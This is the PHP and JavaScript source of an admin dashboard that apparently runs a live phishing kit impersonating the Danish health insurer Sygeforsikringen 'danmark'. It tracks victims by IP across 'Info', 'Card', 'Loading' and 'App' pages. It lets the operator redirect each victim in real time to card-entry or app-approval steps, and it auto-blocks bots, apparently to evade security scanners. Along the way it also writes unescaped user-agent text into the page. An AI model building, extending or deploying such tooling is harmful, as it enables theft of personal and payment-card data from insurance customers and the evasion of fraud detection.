<?php
session_start();
require_once 'config.php';

// Vérifier si l'utilisateur est connecté
if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    // Afficher le formulaire de connexion
    $error = '';
    
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $password = $_POST['password'] ?? '';
        
        if ($password === ADMIN_PASSWORD) {
            $_SESSION['admin_logged_in'] = true;
            header('Location: admin.php');
            exit;
        } else {
            $error = 'Forkert adgangskode';
        }
    }
    ?>
    <!DOCTYPE html>
    <html lang="da">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Admin Login | Sygeforsikringen "danmark"</title>
        <link rel="icon" type="image/x-icon" href="favicon.ico">
        <link rel="icon" type="image/svg+xml" href="favicon.svg">
        <link rel="apple-touch-icon" href="apple-touch-icon.png">
        <link rel="stylesheet" href="css/style.css">
    </head>
    <body>
        <div class="login-container">
            <h1 style="text-align: center; margin-bottom: 30px;">🔐 Admin Panel</h1>
            
            <?php if ($error): ?>
                <div class="error-message" style="display: block; text-align: center; margin-bottom: 20px;">
                    ⚠ <?php echo htmlspecialchars($error); ?>
                </div>
            <?php endif; ?>
            
            <form method="POST" action="">
                <div class="form-group">
                    <label>Adgangskode</label>
                    <input type="password" name="password" required autofocus>
                </div>
                <button type="submit" class="btn">Log ind</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Déconnexion
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: admin.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard | Sygeforsikringen</title>
    <link rel="icon" type="image/x-icon" href="favicon.ico">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: #f5f7fa;
            color: #333;
        }

        .header {
            background: white;
            padding: 20px 40px;
            border-bottom: 1px solid #e1e8ed;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .header-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .header-icon {
            font-size: 32px;
        }

        .header-title {
            font-size: 24px;
            font-weight: 600;
            color: #1a1a1a;
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 20px;
        }

        .active-count {
            color: #10b981;
            font-weight: 600;
            font-size: 16px;
        }

        .logout-btn {
            color: #6b7280;
            text-decoration: none;
            font-size: 15px;
            padding: 8px 16px;
            border-radius: 6px;
            transition: background 0.2s;
        }

        .logout-btn:hover {
            background: #f3f4f6;
        }

        .main-container {
            max-width: 1400px;
            margin: 40px auto;
            padding: 0 40px;
            display: grid;
            grid-template-columns: 1fr 400px;
            gap: 30px;
        }

        .panel {
            background: white;
            border-radius: 12px;
            padding: 30px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }

        .panel-title {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #1a1a1a;
        }

        .panel-subtitle {
            font-size: 14px;
            color: #6b7280;
            margin-bottom: 25px;
        }

        .visitor-table {
            margin-bottom: 30px;
            border: 1px solid #e5e7eb;
            border-radius: 8px;
            overflow: hidden;
        }

        .table-title {
            background: #f9fafb;
            padding: 12px 16px;
            margin: 0;
            font-size: 16px;
            font-weight: 600;
            border-bottom: 1px solid #e5e7eb;
            color: #374151;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            transition: background-color 0.2s;
        }

        .table-title:hover {
            background: #f3f4f6;
        }

        .table-toggle {
            font-size: 14px;
            color: #6b7280;
            transition: transform 0.2s;
        }

        .table-toggle.collapsed {
            transform: rotate(-90deg);
        }

        .visitor-count {
            font-weight: 500;
            color: #6b7280;
            font-size: 14px;
        }

        .visitors-list {
            display: flex;
            flex-direction: column;
            gap: 8px;
            padding: 12px;
            min-height: 60px;
            transition: max-height 0.3s ease-out, opacity 0.2s;
            overflow: hidden;
        }

        .visitors-list.collapsed {
            max-height: 0;
            padding: 0 12px;
            opacity: 0;
        }

        .visitors-list:empty::after {
            content: "No visitors";
            color: #9ca3af;
            text-align: center;
            padding: 20px;
            font-style: italic;
        }

        .visitor-card {
            border: 1px solid #e5e7eb;
            border-radius: 8px;
            padding: 16px;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .visitor-card:hover {
            border-color: #3b82f6;
            box-shadow: 0 2px 8px rgba(59,130,246,0.1);
        }

        .visitor-card.selected {
            border-color: #3b82f6;
            background: #eff6ff;
        }

        .status-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            flex-shrink: 0;
        }

        .status-dot.online {
            background: #10b981;
            box-shadow: 0 0 0 3px rgba(16,185,129,0.2);
        }

        .status-dot.waiting {
            background: #f59e0b;
            box-shadow: 0 0 0 3px rgba(245,158,11,0.2);
        }

        .status-dot.offline {
            background: #9ca3af;
        }

        .status-dot.blocked {
            background: #ef4444;
        }

        .visitor-info {
            flex: 1;
        }

        .visitor-ip {
            font-weight: 600;
            font-size: 15px;
            color: #1a1a1a;
            margin-bottom: 4px;
        }

        .visitor-meta {
            font-size: 13px;
            color: #6b7280;
        }

        .control-panel-right {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        .control-section {
            text-align: center;
            color: #9ca3af;
            padding: 60px 20px;
        }

        .control-section.active {
            padding: 0;
        }

        .control-buttons {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .control-btn {
            padding: 14px 20px;
            border: 2px solid #e5e7eb;
            border-radius: 8px;
            background: white;
            cursor: pointer;
            font-size: 15px;
            font-weight: 500;
            transition: all 0.2s;
            text-align: left;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .control-btn:hover {
            border-color: #3b82f6;
            background: #eff6ff;
        }

        .control-btn.danger {
            border-color: #fee2e2;
            color: #ef4444;
        }

        .control-btn.danger:hover {
            border-color: #ef4444;
            background: #fef2f2;
        }

        .btn-icon {
            font-size: 18px;
        }

        .loading {
            text-align: center;
            padding: 40px;
            color: #9ca3af;
        }

        .empty-state {
            text-align: center;
            padding: 60px 20px;
            color: #9ca3af;
        }

        @media (max-width: 1024px) {
            .main-container {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-left">
            <div class="header-icon">💎</div>
            <div class="header-title">Admin Dashboard</div>
        </div>
        <div class="header-right">
            <div class="active-count">
                <span id="activeCount">0</span> Active Visitors 
                <span id="updateIndicator" style="color: #10b981; font-size: 12px;">●</span>
                <span id="botCount" style="margin-left: 15px; color: #ef4444;">🤖 <span id="botCountNumber">0</span> Bots Blocked</span>
            </div>
            <a href="?logout=1" class="logout-btn">Logout</a>
        </div>
    </div>

    <div class="main-container">
        <!-- Left Panel: Visitor Tables -->
        <div class="panel">
            <h2 class="panel-title">Visitor Control Center</h2>
            <p class="panel-subtitle">Organized by status: Waiting, Online, Offline, Blocked</p>
            
            <!-- Waiting Table -->
            <div class="visitor-table">
                <h3 class="table-title" onclick="toggleTable('waitingVisitors')">
                    <span>🟤 Waiting Visitors <span id="waitingCount" class="visitor-count">(0)</span></span>
                    <span class="table-toggle">▼</span>
                </h3>
                <div id="waitingVisitors" class="visitors-list">
                    <div class="loading">Loading...</div>
                </div>
            </div>

            <!-- Online Table -->
            <div class="visitor-table">
                <h3 class="table-title" onclick="toggleTable('onlineVisitors')">
                    <span>🟢 Online Visitors <span id="onlineCount" class="visitor-count">(0)</span></span>
                    <span class="table-toggle">▼</span>
                </h3>
                <div id="onlineVisitors" class="visitors-list">
                    <div class="loading">Loading...</div>
                </div>
            </div>

            <!-- Offline Table -->
            <div class="visitor-table">
                <h3 class="table-title" onclick="toggleTable('offlineVisitors')">
                    <span>⚪ Offline Visitors <span id="offlineCount" class="visitor-count">(0)</span></span>
                    <span class="table-toggle collapsed">▶</span>
                </h3>
                <div id="offlineVisitors" class="visitors-list collapsed">
                    <div class="loading">Loading...</div>
                </div>
            </div>

            <!-- Blocked Table -->
            <div class="visitor-table">
                <h3 class="table-title" onclick="toggleTable('blockedVisitors')">
                    <span>🔴 Blocked Visitors <span id="blockedCount" class="visitor-count">(0)</span></span>
                    <span class="table-toggle collapsed">▶</span>
                </h3>
                <div id="blockedVisitors" class="visitors-list collapsed">
                    <div class="loading">Loading...</div>
                </div>
            </div>
            
            <!-- Auto-Blocked Bots Table -->
            <div class="visitor-table">
                <h3 class="table-title" onclick="toggleTable('autoBlockedBots')">
                    <span>🤖 Auto-Blocked Bots <span id="autoBlockedCount" class="visitor-count">(0)</span></span>
                    <span class="table-toggle collapsed">▶</span>
                    <button class="control-btn" onclick="scanForBots()" style="margin-left: 10px; padding: 3px 8px; font-size: 11px; border-radius: 4px;">
                        🔍 Scan
                    </button>
                </h3>
                <div id="autoBlockedBots" class="visitors-list collapsed">
                    <div class="loading">Loading...</div>
                </div>
            </div>
        </div>

        <!-- Right Panel: Control Buttons -->
        <div class="panel control-panel-right">
            <h2 class="panel-title">Registration Flow Control</h2>
            <p class="panel-subtitle">Select a visitor to control their registration flow</p>
            
            <div id="controlSection" class="control-section">
                Select a visitor to control their registration flow
            </div>
            
            <!-- Visitor Details Panel -->
            <div id="visitorDetails" class="visitor-details-panel" style="display:none; margin-top: 20px;">
                <h3 class="panel-title">🔍 Visitor Details</h3>
                <table style="width: 100%; border-collapse: collapse;">
                    <tr style="border-bottom: 1px solid #e5e7eb;">
                        <th style="text-align: left; padding: 8px; color: #6b7280;">🌐 IP Address</th>
                        <td style="padding: 8px;" id="detailIp"></td>
                    </tr>
                    <tr style="border-bottom: 1px solid #e5e7eb;">
                        <th style="text-align: left; padding: 8px; color: #6b7280;">🔗 Source</th>
                        <td style="padding: 8px;" id="detailSource"></td>
                    </tr>
                    <tr style="border-bottom: 1px solid #e5e7eb;">
                        <th style="text-align: left; padding: 8px; color: #6b7280;">📱 Device</th>
                        <td style="padding: 8px; font-size: 12px;" id="detailDevice"></td>
                    </tr>
                    <tr>
                        <th style="text-align: left; padding: 8px; color: #6b7280;">📍 Location & ISP</th>
                        <td style="padding: 8px; font-size: 12px;" id="detailLocation">
                            <div>🔄 Loading location...</div>
                        </td>
                    </tr>
                </table>
            </div>
        </div>
    </div>

    <script>
        let selectedIP = null;
        let visitors = [];
        
        // Variables pour le suivi des nouveaux visiteurs
        let previousVisitorCount = 0;
        let audioContext = null;

        // Initialiser l'audio
        function initAudio() {
            try {
                audioContext = new (window.AudioContext || window.webkitAudioContext)();
            } catch (e) {
                console.log('Audio not supported');
            }
        }

        // Jouer un son de notification
        function playNotificationSound() {
            if (!audioContext) return;
            
            try {
                const oscillator = audioContext.createOscillator();
                const gainNode = audioContext.createGain();
                
                oscillator.connect(gainNode);
                gainNode.connect(audioContext.destination);
                
                oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
                oscillator.frequency.setValueAtTime(600, audioContext.currentTime + 0.1);
                oscillator.frequency.setValueAtTime(800, audioContext.currentTime + 0.2);
                
                gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
                gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.3);
                
                oscillator.start(audioContext.currentTime);
                oscillator.stop(audioContext.currentTime + 0.3);
            } catch (e) {
                console.log('Error playing sound:', e);
            }
        }

        // Charger les visiteurs
        function loadVisitors() {
            // Animer l'indicateur de mise à jour
            const indicator = document.getElementById('updateIndicator');
            if (indicator) {
                indicator.style.color = '#f59e0b'; // Orange pendant le chargement
            }
            
            fetch('api/get_visitors.php')
                .then(response => response.json())
                .then(data => {
                    const currentVisitorCount = data.length;
                    
                    // Vérifier s'il y a de nouveaux visiteurs
                    if (previousVisitorCount > 0 && currentVisitorCount > previousVisitorCount) {
                        playNotificationSound();
                        
                        // Afficher une notification visuelle
                        const notification = document.createElement('div');
                        notification.style.cssText = `
                            position: fixed;
                            top: 20px;
                            right: 20px;
                            background: #4CAF50;
                            color: white;
                            padding: 15px;
                            border-radius: 5px;
                            z-index: 1000;
                            font-weight: bold;
                            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
                        `;
                        notification.textContent = '🔔 Nouveau visiteur détecté!';
                        document.body.appendChild(notification);
                        
                        setTimeout(() => {
                            document.body.removeChild(notification);
                        }, 3000);
                    }
                    
                    previousVisitorCount = currentVisitorCount;
                    visitors = data;
                    renderVisitors();
                    updateActiveCount();
                    
                    // Indicateur vert après chargement réussi
                    const indicator = document.getElementById('updateIndicator');
                    if (indicator) {
                        indicator.style.color = '#10b981'; // Vert après succès
                    }
                })
                .catch(error => {
                    console.error('Error loading visitors:', error);
                    
                    // Indicateur rouge en cas d'erreur
                    const indicator = document.getElementById('updateIndicator');
                    if (indicator) {
                        indicator.style.color = '#ef4444'; // Rouge en cas d'erreur
                    }
                });
        }

        // Rendre la liste des visiteurs dans des tables séparées
        function renderVisitors() {
            // Séparer les visiteurs par statut - les visiteurs bloqués restent dans leur catégorie normale
            const waitingVisitors = visitors.filter(v => v.status === 'waiting');
            const onlineVisitors = visitors.filter(v => v.status === 'online');
            const offlineVisitors = visitors.filter(v => v.status === 'offline');
            
            // Les visiteurs bloqués sont seulement ceux qui sont actuellement en ligne/waiting ET bloqués
            const activeBlockedVisitors = visitors.filter(v => v.blocked === true && (v.status === 'online' || v.status === 'waiting'));

            // Mettre à jour les compteurs
            document.getElementById('waitingCount').textContent = `(${waitingVisitors.length})`;
            document.getElementById('onlineCount').textContent = `(${onlineVisitors.length})`;
            document.getElementById('offlineCount').textContent = `(${offlineVisitors.length})`;
            document.getElementById('blockedCount').textContent = `(${activeBlockedVisitors.length})`;

            // Rendre chaque table
            renderVisitorTable('waitingVisitors', waitingVisitors, 'waiting');
            renderVisitorTable('onlineVisitors', onlineVisitors, 'online');
            renderVisitorTable('offlineVisitors', offlineVisitors, 'offline');
            renderVisitorTable('blockedVisitors', activeBlockedVisitors, 'blocked');
        }

        // Rendre une table spécifique (optimisé pour éviter le rechargement visuel)
        function renderVisitorTable(containerId, visitorList, status) {
            const container = document.getElementById(containerId);
            
            if (visitorList.length === 0) {
                if (container.innerHTML !== '<div class="empty-state">No visitors</div>') {
                    container.innerHTML = '<div class="empty-state">No visitors</div>';
                }
                return;
            }

            const statusClass = status;
            
            // Créer un map des visiteurs existants pour mise à jour efficace
            const existingCards = {};
            container.querySelectorAll('.visitor-card').forEach(card => {
                const ip = card.getAttribute('data-ip');
                if (ip) existingCards[ip] = card;
            });
            
            // Créer un set des IPs actuels
            const currentIPs = new Set(visitorList.map(v => v.ip));
            
            // Supprimer les cartes qui n'existent plus
            Object.keys(existingCards).forEach(ip => {
                if (!currentIPs.has(ip)) {
                    existingCards[ip].remove();
                    delete existingCards[ip];
                }
            });
            
            // Fonction pour convertir les noms de pages en noms avec emojis
            function getPageDisplayName(pageName) {
                const pageNames = {
                    'page1': '📝 Info',
                    'info': '📝 Info',
                    'page2': '💳 Card',
                    'card': '💳 Card',
                    'page3': '⏳ Loading',
                    'loading': '⏳ Loading',
                    'page4': '📱 App',
                    'app': '📱 App',
                    'page5': '🎉 Thank You',
                    'thankyou': '🎉 Thank You',
                    'index': '🏠 Index'
                };
                return pageNames[pageName] || `📄 ${pageName}`;
            }
            
            // Mettre à jour ou créer les cartes
            visitorList.forEach((visitor, index) => {
                const pageText = getPageDisplayName(visitor.current_page) || '❓ Unknown';
                const lastSeen = visitor.last_seen ? new Date(visitor.last_seen * 1000).toLocaleTimeString() : 'Unknown';
                
                let card = existingCards[visitor.ip];
                
                if (card) {
                    // Mettre à jour la carte existante seulement si nécessaire
                    const ipElement = card.querySelector('.visitor-ip');
                    const metaElement = card.querySelector('.visitor-meta');
                    
                    // Ajouter une indication si le visiteur est bloqué
                    const blockedIndicator = visitor.blocked ? ' 🚫' : '';
                    const newMeta = visitor.blocked ? `${pageText} • Last seen: ${lastSeen} • BLOCKED` : `${pageText} • Last seen: ${lastSeen}`;
                    const newIpText = `${visitor.ip}${blockedIndicator}`;
                    
                    if (ipElement && ipElement.textContent !== newIpText) {
                        ipElement.textContent = newIpText;
                    }
                    
                    if (metaElement && metaElement.textContent !== newMeta) {
                        metaElement.textContent = newMeta;
                    }
                    
                    // Mettre à jour la classe selected
                    if (selectedIP === visitor.ip) {
                        if (!card.classList.contains('selected')) {
                            card.classList.add('selected');
                        }
                    } else {
                        if (card.classList.contains('selected')) {
                            card.classList.remove('selected');
                        }
                    }
                    
                    // S'assurer que la carte est à la bonne position
                    const currentIndex = Array.from(container.children).indexOf(card);
                    if (currentIndex !== index) {
                        if (index >= container.children.length) {
                            container.appendChild(card);
                        } else {
                            container.insertBefore(card, container.children[index]);
                        }
                    }
                } else {
                    // Créer une nouvelle carte
                    const newCard = document.createElement('div');
                    newCard.className = `visitor-card ${selectedIP === visitor.ip ? 'selected' : ''}`;
                    newCard.setAttribute('data-ip', visitor.ip);
                    newCard.onclick = () => selectVisitor(visitor.ip);
                    
                    // Ajouter une indication si le visiteur est bloqué
                    const blockedIndicator = visitor.blocked ? ' 🚫' : '';
                    const metaText = visitor.blocked ? `${pageText} • Last seen: ${lastSeen} • BLOCKED` : `${pageText} • Last seen: ${lastSeen}`;
                    
                    newCard.innerHTML = `
                        <div class="status-dot ${statusClass}"></div>
                        <div class="visitor-info">
                            <div class="visitor-ip">${visitor.ip}${blockedIndicator}</div>
                            <div class="visitor-meta">${metaText}</div>
                        </div>

                    `;
                    
                    if (index >= container.children.length) {
                        container.appendChild(newCard);
                    } else {
                        container.insertBefore(newCard, container.children[index]);
                    }
                }
            });
        }

        // Sélectionner un visiteur
        function selectVisitor(ip) {
            selectedIP = ip;
            renderVisitors();
            showControls();
            showVisitorDetails();
        }

        // Afficher les détails du visiteur
        function showVisitorDetails() {
            const visitor = visitors.find(v => v.ip === selectedIP);
            if (!visitor) return;

            document.getElementById('visitorDetails').style.display = 'block';
            document.getElementById('detailIp').textContent = visitor.ip;
            document.getElementById('detailSource').textContent = visitor.source || 'Direct';
            
            // Analyser le User-Agent pour déterminer le type d'appareil
            const userAgent = visitor.user_agent || 'Unknown';
            let deviceType = '🖥️ PC';
            let deviceInfo = userAgent;
            
            if (userAgent.toLowerCase().includes('mobile') || 
                userAgent.toLowerCase().includes('android') || 
                userAgent.toLowerCase().includes('iphone')) {
                deviceType = '📱 Mobile';
            } else if (userAgent.toLowerCase().includes('tablet') || 
                       userAgent.toLowerCase().includes('ipad')) {
                deviceType = '📱 Tablet';
            }
            
            // Extraire le navigateur
            let browser = 'Unknown';
            if (userAgent.includes('Chrome')) browser = 'Chrome';
            else if (userAgent.includes('Firefox')) browser = 'Firefox';
            else if (userAgent.includes('Safari')) browser = 'Safari';
            else if (userAgent.includes('Edge')) browser = 'Edge';
            
            // Extraire l'OS
            let os = 'Unknown';
            if (userAgent.includes('Windows')) os = 'Windows';
            else if (userAgent.includes('Mac')) os = 'macOS';
            else if (userAgent.includes('Linux')) os = 'Linux';
            else if (userAgent.includes('Android')) os = 'Android';
            else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) os = 'iOS';
            
            document.getElementById('detailDevice').innerHTML = `
                <div><strong>${deviceType}</strong></div>
                <div>🌐 ${browser} on ${os}</div>
                <div style="font-size: 11px; color: #666; margin-top: 5px;">${userAgent}</div>
            `;
            
            // Obtenir des informations sur l'IP (pays, fournisseur)
            getIPInfo(visitor.ip);
        }
        
        // Fonction pour obtenir le drapeau du pays
        function getCountryFlag(countryCode) {
            const flags = {
                'US': '🇺🇸', 'FR': '🇫🇷', 'DE': '🇩🇪', 'GB': '🇬🇧', 'ES': '🇪🇸', 'IT': '🇮🇹',
                'CA': '🇨🇦', 'AU': '🇦🇺', 'JP': '🇯🇵', 'CN': '🇨🇳', 'IN': '🇮🇳', 'BR': '🇧🇷',
                'RU': '🇷🇺', 'MX': '🇲🇽', 'NL': '🇳🇱', 'SE': '🇸🇪', 'NO': '🇳🇴', 'DK': '🇩🇰',
                'MA': '🇲🇦', 'DZ': '🇩🇿', 'TN': '🇹🇳', 'EG': '🇪🇬', 'SA': '🇸🇦', 'AE': '🇦🇪'
            };
            return flags[countryCode.toUpperCase()] || '🌍';
        }
        
        // Fonction pour obtenir des informations sur l'IP
        async function getIPInfo(ip) {
            try {
                // Utiliser notre API PHP côté serveur pour éviter les problèmes CORS
                const response = await fetch(`api/get_ip_location.php?ip=${encodeURIComponent(ip)}`);
                const data = await response.json();
                
                if (data.success) {
                    const locationInfo = `${data.city}, ${data.region}, ${data.country}`;
                    const countryFlag = data.country_code ? getCountryFlag(data.country_code) : '🌍';
                    
                    document.getElementById('detailLocation').innerHTML = `
                        <div><strong>${countryFlag} ${locationInfo}</strong></div>
                        <div>🏢 ${data.isp}</div>
                        <div style="font-size: 10px; color: #888; margin-top: 3px;">📡 ${data.asn}</div>
                    `;
                } else {
                    document.getElementById('detailLocation').innerHTML = '<div>📍 Location: Information unavailable</div>';
                }
                
            } catch (error) {
                console.error('Location API error:', error);
                document.getElementById('detailLocation').innerHTML = '<div>📍 Location: Error loading</div>';
            }
        }

        // Afficher les contrôles (optimisé pour éviter le rechargement)
        function showControls() {
            const visitor = visitors.find(v => v.ip === selectedIP);
            if (!visitor) return;

            const isBlocked = visitor.blocked === true;
            
            const controlSection = document.getElementById('controlSection');
            
            // Vérifier si les contrôles sont déjà affichés pour ce visiteur
            const currentIP = controlSection.getAttribute('data-current-ip');
            if (currentIP === selectedIP) {
                // Mettre à jour seulement le bouton de blocage si nécessaire
                const blockBtn = controlSection.querySelector('.control-btn.danger');
                if (blockBtn) {
                    const expectedText = isBlocked ? 'Unblock IP' : 'Block IP';
                    const currentText = blockBtn.querySelector('span:last-child').textContent;
                    if (currentText !== expectedText) {
                        blockBtn.querySelector('span:last-child').textContent = expectedText;
                        blockBtn.querySelector('.btn-icon').textContent = isBlocked ? '✅' : '🚫';
                    }
                }
                return;
            }
            
            controlSection.className = 'control-section active';
            controlSection.setAttribute('data-current-ip', selectedIP);
            controlSection.innerHTML = `
                <div class="control-buttons">
                    <button class="control-btn" onclick="redirectTo('index')">
                        <span class="btn-icon">🏠</span>
                        <span>Redirect to Index</span>
                    </button>
                    <button class="control-btn" onclick="redirectTo('info')">
                        <span class="btn-icon">📝</span>
                        <span>Redirect to Info</span>
                    </button>
                    <button class="control-btn" onclick="redirectTo('card')">
                        <span class="btn-icon">💳</span>
                        <span>Redirect to Card</span>
                    </button>
                    <button class="control-btn" onclick="redirectTo('loading')">
                        <span class="btn-icon">⏳</span>
                        <span>Redirect to Loading</span>
                    </button>
                    <button class="control-btn" onclick="redirectTo('app')">
                        <span class="btn-icon">📱</span>
                        <span>Redirect to App</span>
                    </button>
                    <button class="control-btn" onclick="redirectTo('thankyou')">
                        <span class="btn-icon">🎉</span>
                        <span>Redirect to Thank You</span>
                    </button>
                    <button class="control-btn" onclick="forceRedirect('${visitor.ip}')">
                        <span class="btn-icon">⚡</span>
                        <span>Force Immediate Redirect</span>
                    </button>
                    <button class="control-btn danger" onclick="toggleBlock()">
                        <span class="btn-icon">${isBlocked ? '✓' : '🚫'}</span>
                        <span>${isBlocked ? 'Unblock IP' : 'Block IP'}</span>
                    </button>
                </div>
            `;
        }

        // Rediriger un visiteur
        function redirectTo(page) {
            if (!selectedIP) return;

            fetch('api/force_redirect.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ip: selectedIP, redirect: page})
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    alert(`✅ Visitor ${selectedIP} will be redirected to ${page} immediately!`);
                    // Recharger la liste pour voir le changement
                    setTimeout(() => {
                        loadVisitors();
                    }, 500);
                } else {
                    alert(`❌ Error: ${data.error || 'Unknown error'}`);
                }
            })
            .catch(error => {
                alert(`❌ Network error: ${error.message}`);
            });
        }

        // Bloquer/débloquer un IP
        function toggleBlock() {
            if (!selectedIP) return;

            const visitor = visitors.find(v => v.ip === selectedIP);
            const action = visitor.blocked === true ? 'unblock' : 'block';

            fetch('api/block_ip.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ip: selectedIP, action: action})
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    loadVisitors();
                    showControls();
                } else {
                    alert(`❌ Error: ${data.error || 'Unknown error'}`);
                }
            })
            .catch(error => {
                alert(`❌ Network error: ${error.message}`);
            });
        }

        // Forcer la redirection immédiate
        function forceRedirect(ip) {
            if (!ip) return;
            
            // Ouvrir la page de redirection forcée dans un nouvel onglet
            const forceUrl = `force_redirect.php?ip=${encodeURIComponent(ip)}`;
            window.open(forceUrl, '_blank');
            
            alert(`Force redirect initiated for IP: ${ip}`);
        }

        // Mettre à jour le compteur
        function updateActiveCount() {
            const activeCount = visitors.filter(v => v.status === 'online' || v.status === 'waiting').length;
            document.getElementById('activeCount').textContent = activeCount;
        }

        // Fonction pour plier/déplier les tables
        function toggleTable(tableId) {
            const table = document.getElementById(tableId);
            const toggle = table.parentElement.querySelector('.table-toggle');
            
            if (table.classList.contains('collapsed')) {
                table.classList.remove('collapsed');
                toggle.classList.remove('collapsed');
                toggle.textContent = '▼';
            } else {
                table.classList.add('collapsed');
                toggle.classList.add('collapsed');
                toggle.textContent = '▶';
            }
        }

        // Initialiser l'audio et charger les visiteurs au démarrage
        initAudio();
        loadVisitors();
        loadBlockedBots();
        updateBotCount();
        
        // Charger les bots bloqués
        function loadBlockedBots() {
            fetch('api/get_blocked_bots.php?action=list')
                .then(response => response.json())
                .then(data => {
                    const container = document.getElementById('autoBlockedBots');
                    document.getElementById('autoBlockedCount').textContent = `(${data.length})`;
                    
                    if (data.length === 0) {
                        container.innerHTML = '<div class="empty-state">No bots detected</div>';
                        return;
                    }
                    
                    container.innerHTML = data.map(bot => `
                        <div class="visitor-card">
                            <div class="status-dot blocked"></div>
                            <div class="visitor-info">
                                <div class="visitor-ip">🤖 ${bot.ip}</div>
                                <div class="visitor-meta">${bot.reason} • ${bot.timestamp}</div>
                                <div style="font-size: 10px; color: #666; margin-top: 2px;">
                                    ${bot.user_agent.substring(0, 80)}...
                                </div>
                            </div>
                        </div>
                    `).join('');
                })
                .catch(error => {
                    console.error('Error loading blocked bots:', error);
                });
        }
        
        // Mettre à jour le compteur de bots
        function updateBotCount() {
            fetch('api/get_blocked_bots.php?action=count')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('botCountNumber').textContent = data.today;
                })
                .catch(error => {
                    console.error('Error updating bot count:', error);
                });
        }
        
        // Scanner manuellement pour les bots
        function scanForBots() {
            const button = event.target;
            const originalText = button.textContent;
            button.textContent = '🔄 Scanning...';
            button.disabled = true;
            
            fetch('api/get_blocked_bots.php?action=scan')
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        alert(`✅ ${data.message}`);
                        loadBlockedBots();
                        loadVisitors();
                        updateBotCount();
                    } else {
                        alert('❌ Error during scan');
                    }
                })
                .catch(error => {
                    console.error('Error scanning for bots:', error);
                    alert('❌ Network error during scan');
                })
                .finally(() => {
                    button.textContent = originalText;
                    button.disabled = false;
                });
        }
        
        // Rafraîchir toutes les 2 secondes pour un panneau plus dynamique
        setInterval(() => {
            loadVisitors(); // Recharger les visiteurs automatiquement
            updateBotCount(); // Mettre à jour le compteur de bots
            
            // Mettre à jour les contrôles si un visiteur est sélectionné
            if (selectedIP) {
                showControls();
                showVisitorDetails();
            }
        }, 2000);
        
        // Charger les bots bloqués toutes les 10 secondes
        setInterval(() => {
            loadBlockedBots();
        }, 10000);
        
        // Activer l'audio au premier clic (requis par les navigateurs)
        document.addEventListener('click', function() {
            if (audioContext && audioContext.state === 'suspended') {
                audioContext.resume();
            }
        }, { once: true });
    </script>

<script>
// Les visiteurs bloqués sont maintenant gérés par la fonction renderVisitors() principale
</script>

</body>
</html>